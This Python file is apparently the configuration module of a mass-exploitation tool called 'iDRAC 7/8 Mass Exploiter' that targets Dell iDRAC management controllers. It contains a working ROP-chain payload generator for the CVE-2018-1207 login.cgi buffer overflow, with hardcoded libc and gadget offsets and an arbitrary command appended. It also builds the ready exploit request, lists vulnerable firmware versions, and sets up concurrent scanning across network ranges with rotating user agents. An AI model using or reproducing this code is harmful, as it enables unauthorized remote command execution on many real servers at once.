#!/usr/bin/env python3
"""
iDRAC Mass Exploiter Configuration
Standalone GUI Application - NO DISCORD
"""

import struct
import base64
from typing import List, Dict

# ═══════════════════════════════════════════════════════════════════════════════
# APP INFO
# ═══════════════════════════════════════════════════════════════════════════════

APP_INFO = {
    'name': 'iDRAC 7/8 Mass Exploiter',
    'version': '14.0',
    'codename': 'Shadow Walker',
    'author': 'SAM',
}

# ═══════════════════════════════════════════════════════════════════════════════
# CVE-2018-1207 PAYLOAD (FROM YOUR cve.py)
# ═══════════════════════════════════════════════════════════════════════════════

class CVE20181207Payload:
    """CVE-2018-1207 Buffer Overflow Exploit"""
    
    LIBC_BASE = 0x76283000
    GADGET_1 = 0x000D8874
    GADGET_2 = 0x001026D4
    SYSTEM_OFFSET = 0x0003C4D4
    BUFFER_SIZE = 456
    
    @staticmethod
    def generate(command: str) -> str:
        """Generate ROP chain payload"""
        rop_chain = b""
        rop_chain += b"\x00" * CVE20181207Payload.BUFFER_SIZE
        rop_chain += struct.pack("<I", CVE20181207Payload.LIBC_BASE + CVE20181207Payload.GADGET_1)
        rop_chain += b"\x00" * 12
        rop_chain += struct.pack("<I", CVE20181207Payload.LIBC_BASE + CVE20181207Payload.SYSTEM_OFFSET)
        rop_chain += b"\x00" * 4
        rop_chain += struct.pack("<I", CVE20181207Payload.LIBC_BASE + CVE20181207Payload.GADGET_2)
        rop_chain += command.encode()
        
        return base64.b64encode(rop_chain).decode()
    
    @staticmethod
    def generate_login_payload(command: str) -> Dict[str, str]:
        """Generate complete login.cgi payload"""
        payload = CVE20181207Payload.generate(command)
        return {
            'url': '/cgi/login.cgi',
            'method': 'POST',
            'data': f'name={payload}&pwd=&check=1',
            'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
        }

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABLE FIRMWARE
# ═══════════════════════════════════════════════════════════════════════════════

VULNERABLE_FIRMWARE = {
    '7': ['1.30.', '1.40.', '1.50.', '1.57.', '1.60.', '1.65.', '1.66.', '1.70.'],
    '8': ['2.00.', '2.10.', '2.21.', '2.30.', '2.40.', '2.50.', '2.52.', '2.60.', '2.61.']
}

# ═══════════════════════════════════════════════════════════════════════════════
# SETTINGS
# ═══════════════════════════════════════════════════════════════════════════════

SCANNER_CONFIG = {
    'max_concurrent': 100,
    'timeout': 10,
    'cidr_limit': 256,
    'signatures': {
        'idrac7': ['iDRAC 7', 'iDRAC7', 'idrac 7', 'idrac7'],
        'idrac8': ['iDRAC 8', 'iDRAC8', 'idrac 8', 'idrac8'],
    },
    'endpoints': ['/login.html', '/Login.html', '/cgi/login.cgi'],
    'firmware_patterns': [
        r'FirmwareVersion["\']?\s*[:=]\s*["\']?([\d.]+)',
        r'"FirmwareVersion"\s*:\s*"([\d.]+)"',
    ]
}

EXPLOIT_CONFIG = {
    'max_concurrent': 50,
    'timeout': 15,
    'default_command': 'id',
}

SOURCE_CONFIG = {
    'timeout': 15,
    'delay_between': 2,
    'batch_size': 5,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    ]
}

# ═══════════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def is_vulnerable_firmware(version: str, idrac_ver: str) -> bool:
    """Check if firmware is vulnerable"""
    if not version or not idrac_ver:
        return False
    return any(version.startswith(v) for v in VULNERABLE_FIRMWARE.get(idrac_ver, []))

def get_user_agent() -> str:
    """Get random user agent"""
    import random
    return random.choice(SOURCE_CONFIG['user_agents'])

def get_payload(command: str) -> str:
    """Get exploit payload"""
    return CVE20181207Payload.generate(command)

def get_login_payload(command: str) -> Dict[str, str]:
    """Get login payload data"""
    return CVE20181207Payload.generate_login_payload(command)
